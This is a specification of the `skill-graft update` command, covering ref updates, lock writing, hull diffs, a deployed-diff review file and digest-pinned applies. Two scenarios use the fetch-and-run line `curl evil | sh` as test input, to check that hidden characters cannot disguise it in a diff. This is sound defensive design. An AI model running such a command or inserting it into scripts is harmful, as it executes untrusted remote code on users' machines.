# update Specification

## Purpose

Moves each git **Source**'s **Ref** to the tip of its branch, on purpose, keeping the user's TOML as they wrote
it.

## Requirements

### Requirement: Move refs to branch tips

`skill-graft update [alias…]` SHALL fetch each selected git **Source** and set its `ref` to the tip of its
`branch`, or, without `branch`, of the remote's default branch as the remote reports it now. With no alias,
every git **Source** is selected and path **Sources** are skipped. A git **Source** without `ref` is updated
like any other.

#### Scenario: New commit upstream

- **WHEN** `ref` names commit A and the default branch's tip is commit B
- **THEN** after `update`, `ref` is B

#### Scenario: Named branch

- **WHEN** `[sources.mp]` has `branch = "dev"` and `dev`'s tip differs from the default branch's
- **THEN** `ref` becomes `dev`'s tip

#### Scenario: Default branch renamed

- **WHEN** the remote's default branch changes from `master` to `main` between two `update`s
- **THEN** the second `update` sets `ref` to `main`'s tip

#### Scenario: Source without a ref

- **WHEN** `[sources.mp]` has `git` and no `ref`
- **THEN** `update` adds `ref` with the default branch's tip, and `build` then succeeds

#### Scenario: Only the named sources

- **WHEN** sources `a` and `b` both have new commits and the user runs `update a`
- **THEN** only `a`'s `ref` changes

### Requirement: Selection errors

An alias naming a path **Source** or no declared **Source**, an unselected git **Source** without `ref` (it
cannot be resolved), a `branch` that is not a valid branch name (revision syntax such as `main~3` included), a
`branch` the remote lacks (including one deleted since an earlier fetch), and a remote that reports no default
branch when `branch` is absent SHALL be errors naming the alias, and `update` SHALL then write nothing. The
first three SHALL be reported before any remote is contacted. An unselected git **Source** without `ref` SHALL be
reported in one error naming every unselected git **Source** without `ref`, suggesting the command run again with
those added, each alias once and in config order, keeping `--dry-run` and `--diff`, and replacing `--expect` with
`--dry-run`.

#### Scenario: Path source named

- **WHEN** `own` is a path source and the user runs `update own`
- **THEN** `update` exits non-zero saying `own` is a path source, and writes nothing

#### Scenario: Unknown alias

- **WHEN** the user runs `update nope` and no `[sources.nope]` exists
- **THEN** `update` exits non-zero naming `nope`

#### Scenario: Missing branch

- **WHEN** `[sources.mp]` has `branch = "gone"` and the remote has no such branch
- **THEN** `update` exits non-zero naming `mp` and `gone`, and writes nothing

#### Scenario: Revision syntax as branch

- **WHEN** `[sources.mp]` has `branch = "main~3"` or `branch = "main@{1}"`
- **THEN** `update` exits non-zero naming `sources.mp.branch`, before contacting the remote

#### Scenario: Branch deleted upstream

- **WHEN** an earlier `update` fetched branch `dev` of `mp`, `dev` was then deleted upstream, and `mp` has
  `branch = "dev"`
- **THEN** `update` exits non-zero naming `mp` and `dev`, and writes nothing

#### Scenario: Other source without a ref

- **WHEN** `a` has a `ref`, git source `b` has none, and the user runs `update a`
- **THEN** `update` exits non-zero naming `b` and `skill-graft update a b`, before fetching

#### Scenario: Several sources without a ref

- **WHEN** git sources `a` and `b` both have no `ref` and the user runs `update a`
- **THEN** `update` exits non-zero naming `b` and `skill-graft update a b`, before fetching, and running
  `skill-graft update a b` then succeeds

#### Scenario: Hint keeps the review

- **WHEN** git source `b` has no `ref` and the user runs `update a --dry-run --diff review.diff`, or
  `update a --expect <digest> --diff review.diff`
- **THEN** `update` exits non-zero suggesting `skill-graft update a b --dry-run --diff review.diff` either way, and
  `skill-graft.toml` is unchanged

#### Scenario: No default branch

- **WHEN** `mp` has no `branch` and the remote's `HEAD` names no existing branch
- **THEN** `update` exits non-zero naming `mp` and suggesting a `branch` key

#### Scenario: Tip already cached

- **WHEN** the tip of `mp`'s branch is already in the cache
- **THEN** `update` asks the remote only for its branches' tips, and fetches nothing

### Requirement: Resolve before writing

`update` SHALL resolve the **Hull** as `build` does, with each selected **Source** at its new tip and every other
at its current `ref`. Only when that succeeds SHALL it write `skill-graft.lock`, always, and `skill-graft.toml`,
when a `ref` moved. On
failure it SHALL exit non-zero with the resolution error and the shas it would have written, leaving the TOML
and the lock unchanged. `update` SHALL NOT vendor or run `apm`.

#### Scenario: Entry gone upstream

- **WHEN** `mp/tdd` is an **Entry** and the new tip of `mp` has no skill `tdd`
- **THEN** `update` exits non-zero naming `mp/tdd`, prints the new sha, and leaves `skill-graft.toml` byte for
  byte unchanged

#### Scenario: Reference turns ambiguous upstream

- **WHEN** at the new tip of `x`, a skill `notes` appears that `own` also has, and a **Hull** **Skill** in `mp`
  calls `/notes`
- **THEN** `update` exits non-zero naming `/notes` and both **Skill IDs**, and leaves the TOML and lock unchanged

#### Scenario: Subdirectory gone upstream

- **WHEN** `[sources.cp]` has `subdirectory = "pstack/skills"`, and the new tip of `cp` no longer has
  `pstack/skills`
- **THEN** `update` exits non-zero naming `cp`, `pstack/skills` and the new sha, and leaves the TOML and lock
  unchanged

#### Scenario: Lock follows the TOML

- **WHEN** `update` moves `mp`'s `ref` to B
- **THEN** `skill-graft.lock` records B

#### Scenario: Lock written though no ref moved

- **WHEN** no `ref` moves, but a path **Source**'s skill changed since the last lock
- **THEN** `skill-graft.toml` keeps its bytes, and `skill-graft.lock` holds the new hash

#### Scenario: No deploy

- **WHEN** `update` succeeds
- **THEN** `.apm/skills/` is unchanged and `apm` is not run

### Requirement: Edit the TOML in place

`update` SHALL change only the `ref` values of the updated **Sources**, adding a missing `ref` to its source
table, and SHALL keep every comment, blank line, key order and other formatting. The file SHALL be replaced
atomically, and not rewritten when no `ref` changed. A symlinked `skill-graft.toml` SHALL stay a symlink:
its target is what changes.

#### Scenario: Comments survive

- **WHEN** `skill-graft.toml` has comments, including one trailing the `ref` line, and `update` moves `mp`'s
  `ref`
- **THEN** the new file equals the old one with only that sha replaced

#### Scenario: Symlinked config

- **WHEN** `skill-graft.toml` is a symlink to a file elsewhere and `update` moves a `ref`
- **THEN** `skill-graft.toml` is still that symlink, and the file it points to holds the new sha

#### Scenario: Nothing new

- **WHEN** every selected source's tip equals its `ref`
- **THEN** `skill-graft.toml` keeps its bytes and modification time

### Requirement: Report each source

`update` SHALL print one line per selected git **Source**: its alias and the sha its `ref` now names, marked
`(unchanged)` when it did not move.

#### Scenario: Output

- **WHEN** `update` moves `a` to sha B and `b` stays at sha C
- **THEN** it prints `a B` and `b C (unchanged)`

### Requirement: Dry run writes nothing

`update --dry-run` SHALL do everything `update` does, printing the same lines and errors and exiting with the
same code, but SHALL write neither `skill-graft.toml`, `skill-graft.lock` nor the cache, nor anything outside a
temporary folder it removes before exiting, except the **Deployed diff** file `--diff` names. It SHALL read what the
cache already holds, and contact a remote exactly when `update` would. It SHALL say that the TOML and the lock were
not written.

#### Scenario: Dry run

- **WHEN** the default branch has moved and the user runs `update --dry-run`
- **THEN** it prints the new sha and `dry run: skill-graft.toml and skill-graft.lock not written`, and
  `skill-graft.toml`, `skill-graft.lock` and the cache folder are unchanged

#### Scenario: Dry run with an unreachable unselected source

- **WHEN** `b`'s `ref` is in the cache, `b`'s remote is unreachable, and the user runs `update a --dry-run`
- **THEN** it succeeds as `update a` would, reading `b` from the cache

#### Scenario: Dry run with a failing entry

- **WHEN** an **Entry** is gone at the new tip and the user runs `update --dry-run`
- **THEN** it exits non-zero naming the **Entry**, as `update` would

#### Scenario: Dry run with a diff file

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update --dry-run --diff review.diff`
- **THEN** `review.diff` holds `mp/tdd`'s **Deployed diff**, and `skill-graft.toml`, `skill-graft.lock` and the cache
  folder are unchanged

### Requirement: Report the hull diff

After the per-**Source** lines, `update` SHALL print the **Hull diff** between the current `ref`s and the new tips: the
legend `hull (+ added, - removed, ~ changed):`, then `+ <skill id>`, `- <skill id>` or `~ <skill id>` (hash changed)
per **Skill**, sorted by **Skill ID**; or `hull unchanged`.

Under each `+` and `~` line it SHALL print one line per file whose deployed bytes or executable bit differ, sorted by
path:
`<path> (new, <n> bytes)`, `<path> (removed)` or `<path> (changed, <old> -> <new> bytes)`, then `(now executable)` or
`(no longer executable)` where they apply; at most 20 such lines per **Skill**, then `… <n> more`. Each path SHALL be
printed whole and quoted as git's `core.quotePath` quotes it, a name holding a space quoted too, so it is
printable ASCII and two names never print alike. No **Skill** text SHALL be printed, and no diff SHALL be computed
for this summary.

After the **Hull diff**, `update` SHALL read the lock's **Skills** and their hashes, and name each **Skill** that the
old **Hull** and the lock do not hold alike, held by one only or with another hash, in a line
`edited since skill-graft.lock was written, not shown: <skill id>`. A missing or
unreadable lock SHALL name every **Skill** of the old **Hull**.

The diff SHALL never fetch: when a current `ref` is missing or not cached, or the current `ref`s do not resolve, it
SHALL say so instead. A current `ref` not in the cache SHALL be named with its likely causes: a branch fetched
since, history rewritten upstream, or a `ref` set to a commit on no branch. A dry run without `--diff`
whose **Hull diff** marks a **Skill** `+` or `~`, or that has no previous **Hull**, SHALL print, before its `dry run:`
line, the hint
`review: skill-graft update --dry-run --diff <file>` with the **Sources** it was given. Warnings SHALL come from the
new tips only. `--dry-run` SHALL print the same.

#### Scenario: Warnings once

- **WHEN** `mp/tdd` calls `/foo` at both the current `ref` and the new tip, and no **Source** has `foo`
- **THEN** `update` prints the `/foo` warning once

#### Scenario: Legend

- **WHEN** `update` adds `mp/grilling` to the **Hull**
- **THEN** the line before `+ mp/grilling` is `hull (+ added, - removed, ~ changed):`

#### Scenario: Nothing changed

- **WHEN** every skill in the **Hull** keeps its hash at the new tips
- **THEN** `update` prints `hull unchanged`, and no hint

#### Scenario: Skill added upstream

- **WHEN** the new tip of `mp` makes `mp/tdd` call `/grilling`, and `mp` has `grilling`
- **THEN** `update` prints `+ mp/grilling` and `~ mp/tdd`

#### Scenario: Skill dropped upstream

- **WHEN** at the current `ref` `mp/tdd` calls `/grilling`, and at the new tip it does not
- **THEN** `update` prints `- mp/grilling`, with no file lines under it

#### Scenario: Old refs unresolvable

- **WHEN** a selected git **Source** had no `ref`
- **THEN** `update` says there is no previous **Hull** to compare, and succeeds

#### Scenario: Old ref not cached

- **WHEN** `mp`'s `ref` A is not in the cache and its new tip B is
- **THEN** `update` says there is no previous **Hull** to compare: `mp`'s `ref` A is not in the cache, with its likely
  causes; and it fetches nothing

#### Scenario: File lines

- **WHEN** at the new tip `mp/tdd`'s `SKILL.md` grows from 120 to 180 bytes, and it gains an executable `run.sh` of
  40 bytes
- **THEN** under `~ mp/tdd` it prints `SKILL.md (changed, 120 -> 180 bytes)` and
  `run.sh (new, 40 bytes) (now executable)`

#### Scenario: Made executable

- **WHEN** at the new tip only `mp/tdd`'s `run.sh` of 40 bytes turns executable
- **THEN** under `~ mp/tdd` it prints `run.sh (changed, 40 -> 40 bytes) (now executable)`

#### Scenario: Many files

- **WHEN** `mp/big` joins the **Hull** with 50 files
- **THEN** under `+ mp/big` it prints 20 file lines, then `… 30 more`

#### Scenario: Lookalike names

- **WHEN** at the new tip `mp/tdd` gains `SKILL.md` followed by a zero-width space, beside its `SKILL.md`
- **THEN** the two lines name `SKILL.md` and `"SKILL.md\342\200\213"`

#### Scenario: Trailing space

- **WHEN** at the new tip `mp/tdd` gains `run.sh` followed by a space, beside its `run.sh`
- **THEN** the two lines name `run.sh` and `"run.sh "`

#### Scenario: Path source edited since the lock

- **WHEN** after the lock was written, `own/notes`' `SKILL.md`, of a path **Source**, changed, and the user runs
  `update --dry-run`
- **THEN** it prints `edited since skill-graft.lock was written, not shown: own/notes`

#### Scenario: Skill left since the lock

- **WHEN** after the lock was written, an **Entry** `mp/x` was removed from the config, and the user runs
  `update --dry-run`
- **THEN** it names `mp/x` as edited since the lock was written

#### Scenario: Nothing edited since the lock

- **WHEN** nothing changed since `update` last wrote the lock, and the user runs `update --dry-run`
- **THEN** it names no **Skill** as edited since the lock was written

#### Scenario: Hint

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update mp --dry-run` without `--diff`
- **THEN** it prints `review: skill-graft update mp --dry-run --diff <file>`, then its `dry run:` line

#### Scenario: No hint after a real update

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update` without `--dry-run`
- **THEN** it prints no hint

### Requirement: Patches at the new tips

A patch failing at the new tips SHALL fail `update` as any resolution error does, leaving the TOML and the lock
unchanged, and the error SHALL name each failing **Skill**'s **Upstream** folder at the tip, to redo the patch
against. When that folder is in a dry run's temporary cache, it SHALL say instead to run `update` without
`--dry-run` to fetch the tip.

#### Scenario: Patch fails at the tip

- **WHEN** the new tip of `mp` changes the lines a patch to `mp/tdd` replaces
- **THEN** `update` exits non-zero naming the hunk and `mp/tdd`'s folder in the cache export of the new tip, and
  `skill-graft.toml` and `skill-graft.lock` keep their bytes

#### Scenario: Patch redone

- **WHEN** after that failure the user rewrites the patch against the named folder and runs `update` again
- **THEN** `update` moves `mp`'s `ref` to the tip and writes the lock

#### Scenario: Dry run with a failing patch

- **WHEN** the new tip was not cached before, a patch fails there, and the user runs `update --dry-run`
- **THEN** it exits non-zero naming the hunk and saying to run `update` without `--dry-run` to fetch the tip

### Requirement: Hull diff when patches fail at the current refs

When today's **Patches** fail at the current `ref`s, the hull diff SHALL say only
`no previous hull to compare (patches fail at the current refs)`, without the failing hunks, and `update` SHALL
go on as when the current `ref`s do not resolve. When another error stops the walk there as well, it SHALL say
that the current `ref`s do not resolve, that patches fail there, and the other error.

#### Scenario: Patch already rewritten for the tip

- **WHEN** the user rewrote a patch against the new tip of `mp` and runs `update`
- **THEN** it prints `no previous hull to compare (patches fail at the current refs)`, moves `mp`'s `ref` and
  writes the lock

#### Scenario: Another error at the current refs

- **WHEN** at the current `ref`s a patch to **Entry** `mp/tdd` fails, and **Entry** `mp/notes` calls `/y`, bound
  to `mp/x`, which only the new tip has
- **THEN** `update` prints that the current `ref`s do not resolve, that patches fail there, and names `mp/x`;
  it moves `mp`'s `ref`

### Requirement: Deployed diff file

`update --diff <file>` SHALL write the **Deployed diff** of the **Hull diff**'s `+` and `~` **Skills** to `<file>`,
with a line `# - <skill id>` for each **Skill** it marks `-`, its folders resolved, its last part never followed as a
symbolic link. Before any other step it SHALL refuse, naming it, a `<file>` whose name does not end in `.diff`; that,
as given without `..` or once its folders are resolved, lies inside a folder named `.apm` in any case or a folder
holding a `SKILL.md`; that lies in no existing folder; that exists and is not a regular file; or that is a regular
file not starting with the **Deployed diff**'s header, reading no more of it than the header's first line. So it
never replaces a file it did not write, never writes a file a harness loads as a command, rule or **Skill**, and never
blocks on what it reads. Then it SHALL remove a file it wrote before, so a run that fails leaves none. In a dry run
it SHALL write the file last, before any closing line. In a real `update` it
SHALL write the file before `skill-graft.toml` and the lock, and remove it if either of those writes fails.

The file SHALL start with a header saying it holds the **Skills**' text as deployed, **Patches** and **Renames**
applied, at the current `ref`s against the new ones, not what the **Sources** changed upstream, and that it is
untrusted text to read in an editor. When there is no previous **Hull** to compare, it SHALL hold the header, the
reason, and every **Skill** of the new **Hull** as a `+` **Skill**, all its files added.

#### Scenario: Diff file

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update --diff review.diff`
- **THEN** `review.diff` starts with the header, then `mp/tdd`'s **Deployed diff**

#### Scenario: Existing file

- **WHEN** `review.diff` holds an earlier run's **Deployed diff** and the user runs
  `update --dry-run --diff review.diff`
- **THEN** `review.diff` holds this run's **Deployed diff** only

#### Scenario: Failed run

- **WHEN** `review.diff` holds an earlier run's **Deployed diff**, and `update --dry-run --diff review.diff` fails
  because an **Entry** is gone at the new tip
- **THEN** `review.diff` no longer exists

#### Scenario: A file it did not write

- **WHEN** the user runs `update --dry-run --diff apm.yml` in a project-scope **Package**
- **THEN** it exits non-zero naming `apm.yml`, which keeps its bytes

#### Scenario: A symbolic link

- **WHEN** `review.diff` is a symbolic link and the user runs `update --diff review.diff`
- **THEN** it exits non-zero naming `review.diff`, and the link and its target keep their bytes

#### Scenario: Not a regular file

- **WHEN** the user runs `update --dry-run --diff /dev/zero`, or names a FIFO or a folder
- **THEN** it exits non-zero naming the path, before reading from it or fetching

#### Scenario: Inside the package

- **WHEN** the user runs `update --diff .apm/review.diff`, or `.APM/review.diff` on a filesystem that ignores case,
  in a project-scope **Package**
- **THEN** it exits non-zero naming the path, fetches nothing and writes nothing

#### Scenario: Into the package through a link

- **WHEN** `link` is a symbolic link to the **Package**'s `.apm` folder and the user runs
  `update --diff link/review.diff`, or runs `update --diff sub/../.apm/review.diff`
- **THEN** it exits non-zero naming the path, and writes nothing

#### Scenario: Not a diff file name

- **WHEN** the user runs `update --dry-run --diff .claude/commands/review.md`
- **THEN** it exits non-zero naming the path and asking for a name ending in `.diff`, and writes nothing

#### Scenario: Inside a skill's folder

- **WHEN** the user runs `update --dry-run --diff .claude/skills/mp-tdd/review.diff`, and that folder holds a
  `SKILL.md`
- **THEN** it exits non-zero naming the path, and writes nothing

#### Scenario: A failed write after the diff

- **WHEN** `update --diff review.diff` resolves, and writing `skill-graft.toml` fails
- **THEN** `review.diff` does not exist

#### Scenario: A failed diff write

- **WHEN** `update --diff review.diff` resolves, and writing `review.diff` fails
- **THEN** it exits non-zero, and `skill-graft.toml` and the lock keep their bytes

#### Scenario: A failed diff write in a dry run

- **WHEN** `update --dry-run --diff review.diff` resolves, and writing `review.diff` fails
- **THEN** it exits non-zero and prints no `apply:` line

#### Scenario: No previous hull

- **WHEN** a selected git **Source** had no `ref` and the user runs `update --diff review.diff`
- **THEN** `review.diff` holds the header, that reason, and every **Skill** of the new **Hull** as all added

#### Scenario: Patches redone for the new tip

- **WHEN** a **Patch** of `mp/tdd` was redone for `mp`'s new tip and fails at its current `ref`, and the user runs
  `update --dry-run --diff review.diff`
- **THEN** `review.diff` holds every **Skill** of the new **Hull** as all added, and it prints an `apply:` line

#### Scenario: Nothing changed

- **WHEN** every **Skill** keeps its hash and the user runs `update --diff review.diff`
- **THEN** `review.diff` holds the header and says no **Skill** changed

#### Scenario: Skill removed

- **WHEN** at the new tip no **Skill** calls `/grilling` any more, and the user runs `update --dry-run --diff review.diff`
- **THEN** `review.diff` holds the line `# - mp/grilling`, even when no **Skill** changed or joined

#### Scenario: In no folder

- **WHEN** the user runs `update --dry-run --diff typo/review.diff`, and there is no folder `typo`
- **THEN** it exits non-zero naming the path, before fetching

#### Scenario: Through a link named .apm

- **WHEN** `proj/.Apm` is a symbolic link to another folder and the user runs `update --diff proj/.Apm/review.diff`
- **THEN** it exits non-zero naming the path, and writes nothing

### Requirement: Deployed diff content

For each `+` and `~` **Skill**, the **Deployed diff** SHALL open with `# <mark> <skill id>`, then a line naming its
**Source** and, for a git **Source**, its old and new `ref` and its old and new upstream folder (each once when
unchanged, no old one for a `+` **Skill**), and whether it was edited since the lock was written. Every name from a
**Source** on these lines SHALL be quoted as file paths are. It
SHALL give no command to run.

Then it SHALL give a unified diff of every file whose deployed bytes or executable bit differ, at the current `ref`s
against the new ones, a `+` **Skill**'s files all added, in `git diff`'s format: `old mode` and `new mode` lines for an
executable bit, and each header path quoted as git's `core.quotePath` quotes it, `a/` or `b/` inside the quotes, and
quoted too when it holds a space. A file the **Hidden character** check reads as text SHALL be decoded in its encoding,
and every other file as lenient UTF-8; each byte that cannot be decoded SHALL be shown as a `\x..` escape, and no file
as `Binary files … differ`. Lines SHALL be split at line feeds only. In each line, every control, format, line separator
and paragraph separator character but tab, by its Unicode category, and every character the **Hidden character** check
reports or warns of, SHALL be shown as an escape, `\x..` only below U+0080 so that no character reads as a byte that
cannot be decoded, so no editor breaks a line where the diff does not and no two lines look alike that differ. In a
shown file holding both a backslash and a character to escape, every backslash SHALL be shown doubled, so no typed
escape reads as one; when a file's bytes differ but both sides decode to the same lines, both sides SHALL be shown byte
for byte, as lenient UTF-8; when its two sides were read in different encodings, the diff SHALL name both. Each of these
SHALL be said in a line before the file. Computing the diffs of a run SHALL take time and memory within a fixed step
budget, whatever the length of its lines, plus linear time in the bytes read: a file over 1 MB, or one whose diff would
overrun the budget, SHALL show as all its old lines removed and all its new ones added. The diff SHALL be the same on
every machine: no git configuration of the user's changes it.

#### Scenario: Patch applied on both sides

- **WHEN** a **Patch** of `mp/tdd` changes line 3, and the new tip changes line 9
- **THEN** the **Deployed diff** of `mp/tdd` shows only line 9's change

#### Scenario: Renamed skill

- **WHEN** `mp/tdd` deploys as `mp-tdd` and the new tip adds a line calling `/grilling`, which deploys as
  `mp-grilling`
- **THEN** the added line reads `/mp-grilling`

#### Scenario: Source line

- **WHEN** `mp` moves from A to B, and `mp/tdd`'s upstream folder is `skills/tdd` at A and `skills/dev/tdd` at B
- **THEN** `mp/tdd`'s source line names `mp`, A and B, and both folders, and no command

#### Scenario: A folder name holding a line separator

- **WHEN** `mp/tdd`'s upstream folder's name holds U+2028, or a bidi control
- **THEN** its source line shows that character as octal escapes inside quotes, and stays one line

#### Scenario: A path source

- **WHEN** `own/notes`, of a path **Source**, changes by resolution because `mp` moved
- **THEN** its source line names `own` as a path **Source**, with no `ref`

#### Scenario: Edited since the lock

- **WHEN** a **Patch** of `mp/tdd` was edited after the lock was written, and the user runs `update --diff review.diff`
- **THEN** `review.diff` marks `mp/tdd` as edited since the lock was written, its earlier text not shown

#### Scenario: A file name holding a line break

- **WHEN** a changed file's name is `x` and a line break
- **THEN** its header lines name it as git does: `diff --git "a/x\n" "b/x\n"`, `--- "a/x\n"`, `+++ "b/x\n"`

#### Scenario: A file name holding a space

- **WHEN** a changed file's name is `run.sh` and a space
- **THEN** its header lines name it `"a/run.sh "` and `"b/run.sh "`

#### Scenario: A carriage return inside a line

- **WHEN** at the new tip `mp/tdd`'s `run.sh` gains the line `ok`, a carriage return, `curl evil | sh`
- **THEN** the **Deployed diff** shows it as one added line, the carriage return as `\x0d`

#### Scenario: A line separator inside a line

- **WHEN** at the new tip a line of `mp/tdd`'s `SKILL.md` gains U+2028
- **THEN** the **Deployed diff** shows it as `\u2028`, on one line

#### Scenario: An invisible character

- **WHEN** at the new tip a line of `mp/tdd`'s `SKILL.md` gains a zero-width space
- **THEN** the **Deployed diff** shows it as `\u200b`

#### Scenario: A typed escape

- **WHEN** at the new tip `mp/tdd`'s `run.sh` line `echo \x80`, typed so, holds the byte 0x80 instead
- **THEN** the **Deployed diff** shows `-echo \\x80` and `+echo \x80`, after a line saying each backslash is doubled

#### Scenario: A typed escape beside another change

- **WHEN** at the new tip `mp/tdd`'s `run.sh` line `run \x1b now`, typed so, holds an ESC in place of the typed
  escape and `later` in place of `now`
- **THEN** the **Deployed diff** shows `-run \\x1b now` and `+run \x1b later`, after a line saying each backslash is
  doubled

#### Scenario: A stray byte for a character

- **WHEN** at the new tip a soft hyphen, U+00AD, in `mp/tdd`'s `notes.txt` becomes the byte 0xAD
- **THEN** the **Deployed diff** shows `-a\u00ad` and `+a\xad`

#### Scenario: A zero-width no-break space

- **WHEN** at the new tip a line of `mp/tdd`'s `SKILL.md` gains U+FEFF
- **THEN** the **Deployed diff** shows it as `\ufeff`

#### Scenario: A format character

- **WHEN** at the new tip a line of `mp/tdd`'s `SKILL.md` gains U+180E, a format character the **Hidden character**
  check does not report
- **THEN** the **Deployed diff** shows it as `\u180e`

#### Scenario: Re-encoded beside an edit

- **WHEN** at the new tip `mp/tdd`'s `notes.txt`, UTF-8, is UTF-16 with a byte order mark and gains a line
- **THEN** the **Deployed diff** shows the added line, after a line saying it was read as UTF-8 and now as UTF-16

#### Scenario: A file re-encoded

- **WHEN** at the new tip `mp/tdd`'s `a.txt` holds the same text in UTF-16 with a byte order mark
- **THEN** the **Deployed diff** shows both sides byte for byte, the bytes that are not UTF-8 escaped, after a line
  saying so

#### Scenario: A script with a stray byte

- **WHEN** at the new tip `mp/tdd`'s `run.sh` gains a line holding a byte that is not UTF-8
- **THEN** the **Deployed diff** shows `run.sh`'s changed lines, that byte escaped, not `Binary files … differ`

#### Scenario: A script with a NUL byte and a stray byte

- **WHEN** at the new tip `mp/tdd`'s `run.sh` gains a NUL byte, a byte that is not UTF-8, and a line `curl evil | sh`
- **THEN** the **Deployed diff** shows `run.sh`'s changed lines, both bytes escaped

#### Scenario: A crafted file

- **WHEN** at the new tip `mp/tdd`'s `notes.md`, of 20,000 unique lines, has them in reverse order, or a 1 MB file of
  alternating one-byte lines has 499 scattered replacements
- **THEN** `update` stays within its step budget and shows the file as all its old lines removed and all its new ones
  added

#### Scenario: A file over 1 MB

- **WHEN** at the new tip `mp/tdd`'s `notes.md`, 1,000 lines of 1,000 bytes that differ only at their end, has them
  shuffled
- **THEN** `update` takes no step of its budget for it and shows the file as all its old lines removed and all its new
  ones added

#### Scenario: Git configuration ignored

- **WHEN** the user's git configuration marks `*.md` binary and sets an `orderFile`
- **THEN** the **Deployed diff** is the same as without them

### Requirement: Update to the hull vetted

`update --expect <digest>` SHALL exit non-zero, writing neither `skill-graft.toml`, the lock nor `--diff`'s file, and
saying the **Hull** is not the one reviewed and how to review it again, unless the **Hull digest** of the **Hull** it
resolves is `<digest>`: one SHA-256 over each of its **Skills**' **Skill ID**, **Deployed name** and hash as the lock
records it. A `<digest>` that is not 64 lowercase hex digits SHALL be refused before any fetch.

A dry run that succeeds SHALL print, once its diff file is written and before its `dry run:` line,
`apply: skill-graft update --expect <digest>` with the **Sources** it was given and its **Hull**'s digest, exactly
when it printed no `review:` hint and named no **Skill** as edited since the lock was written. With no previous
**Hull**, the lock check SHALL be skipped: the **Deployed diff** shows every **Skill** in full.

#### Scenario: Apply line

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update mp --dry-run --diff review.diff`
- **THEN** it prints `apply: skill-graft update mp --expect <digest>`, then its `dry run:` line

#### Scenario: No apply line before a review

- **WHEN** `mp/tdd` changes at the new tip and the user runs `update --dry-run` without `--diff`
- **THEN** it prints the `review:` hint and no `apply:` line

#### Scenario: Apply line without a previous hull

- **WHEN** `mp`'s `ref` is not in the cache and the user runs `update --dry-run --diff review.diff`
- **THEN** `review.diff` shows every **Skill** as all added, and it prints an `apply:` line

#### Scenario: Hint without a previous hull

- **WHEN** `mp`'s `ref` is not in the cache and the user runs `update --dry-run` without `--diff`
- **THEN** it prints the `review:` hint and no `apply:` line

#### Scenario: No apply line after an edit

- **WHEN** a path **Source**'s `own/notes` changed since the lock was written, and the user runs
  `update --dry-run --diff review.diff`
- **THEN** it names `own/notes` as edited since the lock was written and prints no `apply:` line

#### Scenario: Changed by resolution only

- **WHEN** `mp` moves, and `own/notes`, of a path **Source** unedited since the lock was written, now deploys another
  name for one of its **References**, and the user runs `update mp --dry-run --diff review.diff`
- **THEN** it prints an `apply:` line, and running it writes the lock with `own/notes`' new hash

#### Scenario: Tip moved after vetting

- **WHEN** the user runs `update mp --dry-run --diff review.diff` at tip B, upstream then pushes C changing
  `mp/tdd`, and the user runs the `apply:` line
- **THEN** it exits non-zero naming both digests and the review command, and `skill-graft.toml` and the lock keep
  their bytes

#### Scenario: Path source edited after vetting

- **WHEN** after `update mp --dry-run --diff review.diff`, `own/notes`' `SKILL.md`, of a path **Source**, changes,
  and the user runs the `apply:` line
- **THEN** it exits non-zero, and `skill-graft.toml` and the lock keep their bytes

#### Scenario: Patch edited after vetting

- **WHEN** after `update mp --dry-run --diff review.diff`, a **Patch** of `mp/tdd` changes, and the user runs the
  `apply:` line
- **THEN** it exits non-zero, and `skill-graft.toml` and the lock keep their bytes

#### Scenario: Rename after vetting

- **WHEN** after the review, a **Rename** gives `mp/tdd` another **Deployed name**, and the user runs the `apply:` line
- **THEN** it exits non-zero, and `skill-graft.toml` and the lock keep their bytes

#### Scenario: Unrelated push

- **WHEN** after the review upstream pushes a commit that changes no **Skill** of the **Hull**, and the user runs the
  `apply:` line
- **THEN** `mp`'s `ref` becomes the new tip, and the lock is written

#### Scenario: Diff file on a mismatch

- **WHEN** the user runs `update --expect <digest> --diff review.diff` and the digest does not match
- **THEN** `review.diff` does not exist

#### Scenario: Malformed digest

- **WHEN** the user runs `update --expect abc123`
- **THEN** it exits non-zero naming the digest and asking for 64 hex digits, before any fetch
